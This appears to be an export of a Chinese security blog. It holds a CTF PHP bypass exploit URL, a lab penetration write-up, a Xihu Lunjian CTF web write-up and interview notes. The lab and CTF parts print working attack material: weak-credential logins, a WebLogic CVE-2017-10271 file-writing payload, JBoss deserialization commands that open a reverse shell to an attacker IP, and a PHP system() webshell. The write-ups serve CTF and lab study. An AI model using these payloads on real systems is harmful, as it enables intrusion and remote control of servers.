class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$b</span>==<span class="number">10</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;祝你好运&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag2</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;运气不太行呀！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$m</span> = md5(<span class="variable">$_GET</span>[<span class="string">&#x27;rq&#x27;</span>]);           <span class="comment">#rq</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;fp&#x27;</span>] == <span class="variable">$m</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag3</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$fp</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;失败&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$n</span> = hash(<span class="string">&#x27;ripemd160&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;np&#x27;</span>]);   <span class="comment">#np</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;nq&#x27;</span>] === <span class="variable">$n</span>)&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$flag4</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$np</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;失败&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hell</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;key3&#x27;</span>];                  <span class="comment">#key3</span></span><br><span class="line"><span class="keyword">if</span>(strpos(<span class="variable">$hell</span>, <span class="string">&#x27;i&#x27;</span>)!==<span class="literal">false</span> || strpos(<span class="variable">$hell</span>, <span class="string">&#x27;I&#x27;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&quot;不能这样！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$data</span> = unserialize(<span class="variable">$hell</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$data</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="variable">$adminName</span> &amp;&amp; <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$adminPassword</span>) &#123;</span><br><span class="line"> <span class="keyword">echo</span> <span class="variable">$flag5</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="keyword">die</span>(<span class="string">&quot;没用的&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;120.25.24.45:30194&#x2F;show_code.php?key1&#x3D;56.1%20&amp;key2&#x3D;10-2&amp;rq&#x3D;1&amp;fp&#x3D;c4ca4238a0b923820dcc509a6f75849b&amp;np&#x3D;1&amp;nq&#x3D;c47907abd2a80492ca9388b05c0e382518ff3960&amp;key3&#x3D;a:2:&#123;s:8:%22username%22;b:1;s:8:%22password%22;b:1;&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>简单的靶场渗透</title>
    <url>/2022/01/03/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9D%B6%E5%9C%BA%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">提示：一共12个flag，有内网。</span><br><span class="line">标准：5个合格</span><br><span class="line">靶场地址：http:&#x2F;&#x2F;1.14.65.168:8077&#x2F;m&#x2F;index.php</span><br><span class="line">刚过完年，来玩一玩</span><br></pre></td></tr></table></figure>

<p>[TOC]</p>
<span id="more"></span>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">获得flag:</span><br><span class="line">1.14.65.168    </span><br><span class="line">        flag&#123;dc53e209ffa7f1cd8c7ebdc2eeff34a7&#125;    </span><br><span class="line">flag1 : flag&#123;f784234649d7ef161229349d1d76ba8d&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.38tomcat</span><br><span class="line">flag3 ：flag&#123;03bbcaf39bdd08fa8d0d9e5477e102c5&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.66</span><br><span class="line">flag5  :flag&#123;b717ca3e4543f05e6970ede833d68ba4&#125;</span><br><span class="line"></span><br><span class="line">172.16.20.76</span><br><span class="line">flag4  :flag&#123;22fceae28669c34d139f7ff6db690acb&#125; </span><br><span class="line"></span><br><span class="line">172.16.20.135</span><br><span class="line">flag9  :flag&#123;27e6221a8a55c8ee7396e74531dc7d9d&#125;</span><br></pre></td></tr></table></figure>





<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>Powered by <a href="http://www.dedecms.com/"><strong>DedeCMSV57_UTF8_SP1</strong></a> </p>
<p><a href="http://1.14.65.168:8077/data/admin/ver.txt">http://1.14.65.168:8077/data/admin/ver.txt</a>       版本时间20170303</p>
<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><a href="http://1.14.65.168:8077/dede/">http://1.14.65.168:8077/dede/</a>             admin/admin 后台弱口令</p>
<p>后台任意文件上传</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102150406908.png" alt="image-20220102150406908"></p>
<p>哥斯拉连接，看了要提权</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151302899.png" alt="image-20220102151302899"></p>
<p>html目录下     第一个flag{dc53e209ffa7f1cd8c7ebdc2eeff34a7}  ，或者robots.txt 直接给的有路径</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151350497.png" alt="image-20220102151350497"></p>
<p>根目录下   第二个flag{f784234649d7ef161229349d1d76ba8d}</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102151427997.png" alt="image-20220102151427997"></p>
<p>本机为172.16.20.66</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102152600971.png" alt="image-20220102152600971"></p>
<h2 id="内网其他主机扫描"><a href="#内网其他主机扫描" class="headerlink" title="内网其他主机扫描"></a>内网其他主机扫描</h2><p>发现某位师傅的fscan（<a href="https://github.com/shadow1ng/fscan">shadow1ng/fscan: 一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 (github.com)</a>），正好对内网172.16.20.* 网段存活主机扫描</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102155438573.png" alt="image-20220102155438573"></p>
<p>发现其他5台存活主机</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(icmp) Target &#39;172.16.20.38&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.62&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.66&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.76&#39; is alive</span><br><span class="line">(icmp) Target &#39;172.16.20.135&#39; is alive</span><br><span class="line">icmp alive hosts len is: 5</span><br><span class="line">172.16.20.38:8009 open</span><br><span class="line">172.16.20.135:8009 open</span><br><span class="line">172.16.20.66:1080 open</span><br><span class="line">172.16.20.135:8080 open</span><br><span class="line">172.16.20.76:8080 open</span><br><span class="line">172.16.20.38:8080 open</span><br><span class="line">172.16.20.62:7001 open</span><br><span class="line">172.16.20.66:80 open</span><br><span class="line">172.16.20.135:8093 open</span><br><span class="line">172.16.20.135:8083 open</span><br><span class="line">alive ports len is: 10</span><br><span class="line">start vulscan</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.62:7001  code:404 len:1164   title:Error 404--Not Found</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.62:7001  [weblogic] </span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080  code:302 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8083 code:400 len:0      title:None</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 code:200 len:10     title:Login Page</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.38:8080  code:200 len:20     title:Apache Tomcat&#x2F;8.0.43</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.135:8080 code:200 len:1507   title:Welcome to JBoss&amp;trade;</span><br><span class="line">[*] WebTitle:http:&#x2F;&#x2F;172.16.20.66       code:200 len:12     title:我的网站</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.76:8080&#x2F;login;jsessionid&#x3D;0DDFC6D0809CA87D818E92B67A8CFC33 [Shiro] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br><span class="line">[+] InfoScan:http:&#x2F;&#x2F;172.16.20.135:8080 [Jboss JBOSS] </span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080&#x2F;manager&#x2F;html tomcat tomcat</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.38:8080 poc-yaml-tomcat-manager-week</span><br></pre></td></tr></table></figure>







<h2 id="挂代理"><a href="#挂代理" class="headerlink" title="挂代理"></a>挂代理</h2><p>frp 代理出现两个问题，</p>
<p>1，我的frpc竟然不能运行，重新下载了</p>
<p>2，这个报错是frpc.ini里面的注释没有删除</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164513360.png" alt="image-20220102164513360"></p>
<p>终于代理好了，</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102164839124.png" alt="image-20220102164839124"></p>
<p>下面就一个一个网站看吧</p>
<h3 id="172-16-20-38-tomcat"><a href="#172-16-20-38-tomcat" class="headerlink" title="172.16.20.38 tomcat"></a>172.16.20.38 tomcat</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165200772.png" alt="image-20220102165200772"></p>
<p><a href="http://172.16.20.38:8080/manager/html">http://172.16.20.38:8080/manager/html</a> </p>
<p>tomcat tomcat登陆，进入后台</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102165822763.png" alt="image-20220102165822763"></p>
<p>Tomcat 后台部署war木马getshell       哥斯拉生成shel.jsp，jar -cvf sh.war shel.jsp</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102172206117.png" alt="image-20220102172206117"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173735362.png" alt="image-20220102173735362"></p>
<p><a href="http://172.16.20.38:8080/sh/shel.jsp">http://172.16.20.38:8080/sh/shel.jsp</a>  </p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102173917456.png" alt="image-20220102173917456"></p>
<p>拿到flag3 ：flag{03bbcaf39bdd08fa8d0d9e5477e102c5}</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174042500.png" alt="image-20220102174042500"></p>
<p>root权限，双网卡发现inet 10.2.5.20/20 brd 10.2.15.255 scope global eth1  另一个网段10.2.5.*</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174312642.png" alt="image-20220102174312642"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102174301803.png" alt="image-20220102174301803"></p>
<h3 id="172-16-20-62-weblogic"><a href="#172-16-20-62-weblogic" class="headerlink" title="172.16.20.62 weblogic"></a>172.16.20.62 weblogic</h3><p><a href="http://172.16.20.62:7001/">http://172.16.20.62:7001</a>  fscan扫出来的是weblogic</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2020-14750</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-cve-2017-10271</span><br><span class="line">[+] http:&#x2F;&#x2F;172.16.20.62:7001 poc-yaml-weblogic-ssrf</span><br></pre></td></tr></table></figure>



<p>能访问<a href="http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11%E8%AF%B4%E6%98%8E%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8cve-2017-10271%E6%BC%8F%E6%B4%9E">http://172.16.20.62:7001/wls-wsat/CoordinatorPortType11说明可能存在cve-2017-10271漏洞</a></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102181059955.png" alt="image-20220102181059955"></p>
<p>我说咋不能利用exp，原来，burp没有挂代理。。。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">172.16</span><span class="number">.20</span><span class="number">.62</span>:<span class="number">7001</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">95.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">95.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">DNT: 1</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Cache-Control: max-age=0</span></span><br><span class="line"><span class="comment">Content-Type: text/xml</span></span><br><span class="line"><span class="comment">Content-Length: 3282</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="comment">         &lt;java version=&quot;1.6.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span></span><br><span class="line"><span class="comment">                    &lt;object class=&quot;java.io.PrintWriter&quot;&gt; </span></span><br><span class="line"><span class="comment">                        &lt;string&gt;servers/AdminServer/tmp/_WL_internal/wls-wsat/54p17w/war/1.jsp&lt;/string&gt;&lt;void method=&quot;println&quot;&gt;</span></span><br><span class="line"><span class="comment">                        &lt;string&gt;</span></span><br><span class="line"><span class="comment">&lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt;]]&gt;&lt;/string&gt;&lt;/void&gt;&lt;void method=&quot;close&quot;/&gt;</span></span><br><span class="line"><span class="comment">                    &lt;/object&gt;</span></span><br><span class="line"><span class="comment">            &lt;/java&gt;</span></span><br><span class="line"><span class="comment">        &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="comment">      &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="comment">      &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="comment">&lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&lt;% out.print(&quot;test&quot;); %&gt; 换成对应jsp🐎</span></span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003302676.png" alt="image-20220103003302676"></p>
<p><a href="http://172.16.20.62:7001/wls-wsat/1.jsp">http://172.16.20.62:7001/wls-wsat/1.jsp</a></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003242901.png" alt="image-20220103003242901"></p>
<p>哥斯拉链接</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002839036.png" alt="image-20220103002839036"></p>
<p>root用户，无其他网段</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103002921369.png" alt="image-20220103002921369"></p>
<p>flag5  :flag{b717ca3e4543f05e6970ede833d68ba4}</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103003009202.png" alt="image-20220103003009202"></p>
<h3 id="172-16-20-76-Shiro"><a href="#172-16-20-76-Shiro" class="headerlink" title="172.16.20.76 Shiro"></a>172.16.20.76 Shiro</h3><p>[*] WebTitle:<a href="http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33">http://172.16.20.76:8080/login;jsessionid=0DDFC6D0809CA87D818E92B67A8CFC33</a> code:200 len:10     title:Login Page</p>
<p>确定为Shiro</p>
<p>用工具<a href="https://github.com/j1anFen/shiro_attack/releases">https://github.com/j1anFen/shiro_attack/releases</a></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021106383-16411470674991.png" alt="image-20220103021106383"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021136691.png" alt="image-20220103021136691"></p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220103021026217.png" alt="image-20220103021026217"></p>
<h3 id="172-16-20-135-JBoss"><a href="#172-16-20-135-JBoss" class="headerlink" title="172.16.20.135 JBoss"></a>172.16.20.135 JBoss</h3><p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102231302358.png" alt="image-20220102231302358"></p>
<ul>
<li><p><a href="http://172.16.20.135:8080/web-console/">JBoss Web Console</a></p>
<p>  admin  admin 进入</p>
</li>
</ul>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102230723865.png" alt="image-20220102230723865"></p>
<p>确定版本可以使用CVE-2017-7504  [JBoss 4.x JBossMQ JMS 反序列化漏洞]([（CVE 2017 7504）JBoss 4.x JBossMQ JMS 反序列化漏洞 - Wiki (96.mk)](<a href="https://wiki.96.mk/Web%E5%AE%89%E5%85%A8/Jboss/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/%EF%BC%88CVE-2017-7504%EF%BC%89JBoss">https://wiki.96.mk/Web安全/Jboss/反序列化漏洞/（CVE-2017-7504）JBoss</a> 4.x JBossMQ JMS 反序列化漏洞/))</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo git clone https:&#x2F;&#x2F;github.com&#x2F;ianxtianxt&#x2F;CVE-2015-7501.git</span><br><span class="line"></span><br><span class="line">javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</span><br><span class="line">java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap 192.168.1.192:4444（IP是攻击机ip,4444是要监听的端口)</span><br><span class="line"></span><br><span class="line">nc -lvnp 4444</span><br><span class="line">curl http:&#x2F;&#x2F;172.16.20.135:8080&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</span><br></pre></td></tr></table></figure>



<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102233858765.png" alt="image-20220102233858765"></p>
<p>root权限</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234228765.png" alt="image-20220102234228765"></p>
<p>inet 10.2.5.62/20 brd 10.2.15.255 scope global eth1    发现10.2.5.*网段</p>
<p><img src="https://gitee.com/shmily1ng/md-image/raw/master/SN/image-20220102234258565.png" alt="image-20220102234258565"></p>
<hr>
<p>干不动了，二层三层内网后续更新，哎实际上就是代理+漏洞复现。</p>
<p>感悟：第一是工具，第二是漏洞不是很敏感</p>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>漏洞利用</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑web复现</title>
    <url>/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-10-17/</url>
    <content><![CDATA[<h3 id="web-esayjson"><a href="#web-esayjson" class="headerlink" title="web-esayjson"></a>web-esayjson</h3><blockquote>
<p><a href="http://easyjson.xhlj.wetolink.com/">http://easyjson.xhlj.wetolink.com/</a></p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;security.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))&#123;   <span class="comment">//source不能为空</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;sandbox/&#x27;</span>.sha1(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]).<span class="string">&#x27;/&#x27;</span>; <span class="comment">//沙盒，设置沙盒根据自己ip获得目录</span></span><br><span class="line">var_dump(<span class="variable">$sandbox</span>);</span><br><span class="line"><span class="keyword">if</span>(!file_exists(<span class="variable">$sandbox</span>))&#123;    <span class="comment">//没有就创建沙盒</span></span><br><span class="line">    mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$sandbox</span>.<span class="string">&quot;index.php&quot;</span>,<span class="string">&quot;&lt;?php echo &#x27;Welcome To Dbapp OSS.&#x27;;?&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"><span class="variable">$content</span> = file_get_contents(<span class="string">&quot;php://input&quot;</span>); <span class="comment">//POST传入</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span> == <span class="string">&quot;write&quot;</span> &amp;&amp;  SecurityCheck(<span class="string">&#x27;filename&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]) &amp;&amp;SecurityCheck(<span class="string">&#x27;content&#x27;</span>,<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="variable">$content</span> = json_decode(<span class="variable">$content</span>);  </span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    <span class="variable">$filecontent</span> = <span class="variable">$content</span>-&gt;content;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$sandbox</span>.<span class="variable">$filename</span>;</span><br><span class="line">    file_put_contents(<span class="variable">$filename</span>,<span class="variable">$filecontent</span>.<span class="string">&quot;\n Powered By Dbapp OSS.&quot;</span>); <span class="comment">//json格式内容写入</span></span><br><span class="line">&#125;<span class="keyword">elseif</span>(<span class="variable">$action</span> == <span class="string">&quot;reset&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$files</span> = scandir(<span class="variable">$sandbox</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="variable">$file</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>)&#123;</span><br><span class="line">                unlink(<span class="variable">$sandbox</span>.<span class="variable">$file</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Security Check Failed.&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<span id="more"></span>
<p><a href="https://blog.csdn.net/weixin_30940783/article/details/95444711">file_get_contents(“php://input”)理解</a></p>
<blockquote>
<p>思路：先生成一个沙盒目录，写入json格式内容，读取flag</p>
</blockquote>
<p>SecurityCheck()函数会对json格式的内容进行验证，对<code>content</code>这个变量进行了过滤。并且filename这个参数可以后缀名是<code>.php</code>而且不能的数字</p>
<p>json格式进行绕过：<a href="https://xz.aliyun.com/t/306">浅谈json参数解析对waf绕过的影响</a></p>
<p>wp测试说<a href="https://tool.chinaz.com/tools/unicode.aspx">unicode编码</a>可以绕过</p>
<p><img src="/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-10-17/1.png" alt="1"></p>
<p><img src="/2020/10/17/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912020-10-17/2.png" alt="1"></p>
<p><a href="https://mp.weixin.qq.com/s/Jbdd3Oa8MnymI-ooJA-t0w">参考官方wp</a></p>
<hr>
<p>内容也可以写入<code>&#123;&quot;content&quot;:&quot;&lt;?php $_GET[0]($_GET[1]);? &gt;&quot;&#125;</code>的 编码</p>
<p>然后<a href="http://easyjson.xhlj.wetolink.com/sandbox/8ff393509060e51038c905a23f595aa3c9454ef6/?0=system&amp;1=/readflag">http://easyjson.xhlj.wetolink.com/sandbox/8ff393509060e51038c905a23f595aa3c9454ef6/?0=system&amp;1=/readflag</a> 获得flag</p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTQ4NzE2Ng==&mid=2247485137&idx=1&sn=a1d922b42556987ba5faa934cfb70218&chksm=e8a22500dfd5ac16c3fbba18d42f53ed6946fa98aaffc5d2829398e70b5fae2f85157889c32d&mpshare=1&scene=23&srcid=1012k3QtXa1fT24ENVA2p5fy&sharer_sharetime=1602491754980&sharer_shareid=8d22639189eb829cec87293a984e60e9#rd">参考文章</a>                                                <a href="https://blog.csdn.net/qq_46091464/article/details/108967312?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~first_rank_v2~rank_v25-11-108967312.nonecase&utm_term=%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91&spm=1000.2123.3001.4430">参考2</a></p>
<hr>
<h3 id="HardXSS"><a href="#HardXSS" class="headerlink" title="HardXSS"></a>HardXSS</h3><hr>
<blockquote>
<p><a href="https://xss.hardxss.xhlj.wetolink.com/">https://xss.hardxss.xhlj.wetolink.com/</a></p>
</blockquote>
<p><a href="https://mp.weixin.qq.com/s/QjwUMa7SNS5gDsDxC-e19Q">wp</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>2020西湖论剑web</tag>
      </tags>
  </entry>
  <entry>
    <title>面经</title>
    <url>/2021/07/01/%E9%9D%A2%E7%BB%8F/</url>
    <content><![CDATA[<ul>
<li>记录下个人面试经验</li>
</ul>
<h2 id="赛宁网安"><a href="#赛宁网安" class="headerlink" title="赛宁网安"></a>赛宁网安</h2><p>信息安全实习生   base南京</p>
<h4 id="一面"><a href="#一面" class="headerlink" title="一面"></a>一面</h4><p>2021.6 电话面试（hr邀请）</p>
<ul>
<li>sql注入有回显和没有回显，怎么处理</li>
<li>sql注入过滤绕过</li>
<li>xss绕过</li>
<li>csrf利用</li>
</ul>
<span id="more"></span>

<ul>
<li>文件上传利用，绕过</li>
<li>中间件一些（解析）漏洞</li>
<li>php反序列化，php文件包含</li>
<li>php代码审计的一些东西</li>
<li>ssrf利用，出现在哪些地方</li>
<li>redis  getshell 的几种方式</li>
<li>mysql提权</li>
<li>windows/linux提权</li>
<li>mssql提权</li>
<li>给你一个域名，说下你的渗透测试思路</li>
<li>护网的一些经历</li>
</ul>
<p>感觉也有部分没有回答出来，提权和redis那块不是很了解。</p>
<p>总体来说面的很全面，面试官很好，只有一面，很快通过了。</p>
<p>在boss直聘上投的。</p>
<h2 id="长亭科技"><a href="#长亭科技" class="headerlink" title="长亭科技"></a>长亭科技</h2><p>安全服务实习生    base南京</p>
<h4 id="一面-1"><a href="#一面-1" class="headerlink" title="一面"></a>一面</h4><p>2021.6 电话面试</p>
<ul>
<li>不想写了，反正是非常基础的知识原理(基础web+代码审计+渗透测试流程)。</li>
</ul>
<p>这是上海给我面的，感觉面试官很好，比较简单，考察不深，我说他们搞错了，然后二面转南京了。</p>
<h4 id="二面"><a href="#二面" class="headerlink" title="二面"></a>二面</h4><p>2021.6 视频面试</p>
<ul>
<li><p>自我介绍，紧张到嘴瓢。。</p>
</li>
<li><p>报错注入函数</p>
</li>
</ul>
